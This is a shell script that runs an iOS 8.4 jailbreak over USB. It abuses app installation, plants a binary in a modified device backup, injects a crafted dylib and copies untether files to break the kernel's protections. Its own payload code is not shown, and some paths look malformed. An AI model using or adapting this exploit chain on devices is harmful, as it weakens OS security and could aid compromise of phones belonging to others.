#!/bin/sh

### Initial vars ###

SCRIPTPATH=`dirname $0`
ddi="$(find /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport 2>/dev/null | grep "8.4/.*.dmg$" || echo './data/DeveloperDiskImage.dmg' | head -1)"

cd $SCRIPTPATH

### Functions ###

function abort() {
echo "Error. Exiting..." >&2
exit 254;
}


### Ddi mount function ###

function mount_ddi(){
echo "Mounting DDI..."
./bin/ideviceimagemounter "$ddi" >/dev/null || echo "Couldn't mount DDI. Not an issue if Xcode's running, an issue if it isn't."
}

### Device detection function ###

function wait_for_device() {
echo "Waiting for device..."
while ! (./bin/afcclient deviceinfo | grep -q FSTotalBytes); do sleep 5; done 2>/dev/null
}

### Jailbreak Functions ###
# Stage 1:
# set-up environment, install app and swap binaries

function stage1(){
echo "Setting up environment..."

./bin/afcclient put ./data/WWDC_Info_TOC.plist /yalu.plist | grep Uploaded || abort

echo "
Installing app & swapping binaries..."

./bin/mobiledevice install_app ./data/WWDC-TOCTOU.ipa || abort

echo "
Please wait..."

sleep 5
./bin/afcclient put ./data/WWDC_Info_TOU.plist /yalu.plist | grep Uploaded || abort

echo
}

# Stage 0:
# Important stuff

stage0() {
echo "DISABLE FIND MY PHONE"
# Waiting for device
wait_for_device

echo "Recreating temp directory..."
rm -rf tmp
mkdir tmp

(
echo "Creating dirs on device">&2
./bin/afcclient mkdir PhotoData/KimJongCracks
./bin/afcclient mkdir PhotoData/KimJongCracks/a
./bin/afcclient mkdir PhotoData/KimJongCracks/a/a
./bin/afcclient mkdir PhotoData/KimJongCracks/Library
./bin/afcclient mkdir PhotoData/KimJongCracks/Library/PrivateFrameworks
./bin/afcclient mkdir PhotoData/KimJongCracks/Library/PrivateFrameworks/GPUToolsCore.framework

# Stage 1
stage1 || abort

# Backup device data

echo "Backing up, could take several minutes..." >&2
./bin/idevicebackup2 backup tmp || abort
udid="$(ls tmp | head -1)"

echo "Mounting ddi and copying files to backup directory">&2

mkdir tmp_ddi
hdiutil attach -nobrowse -mountpoint tmp_ddi "$ddi"
cp tmp_ddi/Applications/MobileReplayer.app/MobileReplayer tmp/MobileReplayer
cp tmp_ddi/Applications/MobileReplayer.app/Info.plist tmp/MobileReplayerInfo.plist
hdiutil detach tmp_ddi
rm -rf tmp_ddi

echo "Compiling and copying binary file to device...">&2

lipo tmp/MobileReplayer -thin armv7s -output ./tmp/MobileReplayer
./bin/mbdbtool tmp $udid CameraRollDomain rm Media/PhotoData/KimJongCracks/a/a/MobileReplayer
./bin/mbdbtool tmp $udid CameraRollDomain put ./tmp/MobileReplayer Media/PhotoData/KimJongCracks/a/a/MobileReplayer || abort
)

# Restore modified backup
echo "Restoring modified backup..."
(
./bin/idevicebackup2 restore tmp --system --reboot || abort
)>/dev/null

# ZZZZZZ....
echo "Sleeping until device reboot..."
sleep 20

# Wait for device
wait_for_device
read -p "Press [Enter] key when your device finishes restoring."
echo

# Mount ddi
mount_ddi

echo "Fetching symbols..."
./bin/fetchsymbols -f "$(./bin/fetchsymbols -l 2>&1 | (grep armv7 || abort ) | tr ':' '\n'|tr -d ' '|head -1)" tmp/cache
./bin/fetchsymbols -f "$(./bin/fetchsymbols -l 2>&1 | (grep dyld$ || abort ) | tr ':' '\n'|tr -d ' '|head -1)" tmp/dyld.fat

echo "Compiling jailbreak files..."
cd tmp
lipo -info dyld.fat | grep Non-fat >/dev/null || (lipo dyld.fat -thin "$(lipo -info dyld.fat | tr ' ' '\n' | grep v7)" -output dyld; mv dyld dyld.fat) && mv dyld.fat dyld
$SCRIPTPATH./bin/jtool -e IOKit cache
$SCRIPTPATH./bin/jtool -e libsystem_kernel.dylib cache
cd $SCRIPTPATH./data/dyldmagic
./make.sh

echo "Copying files to device..."
cd $SCRIPTPATH./../
./bin/afcclient put ./data/dyldmagic/magic.dylib PhotoData/KimJongCracks/Library/PrivateFrameworks/GPUToolsCore.framework/GPUToolsCore
./bin/afcclient put ./data/untether/untether drugs
zcat ./data/bootstrap.tgz > ./tmp/bootstrap.tar
./bin/afcclient put ./tmp/bootstrap.tar PhotoData/KimJongCracks/bootstrap.tar
./bin/afcclient put ./data/tar PhotoData/KimJongCracks/tar

echo "Tap on the jailbreak icon to crash the kernel (or 0wn it if you're in luck!)"
}

# Let's do this!
stage0 || abort

exit 0
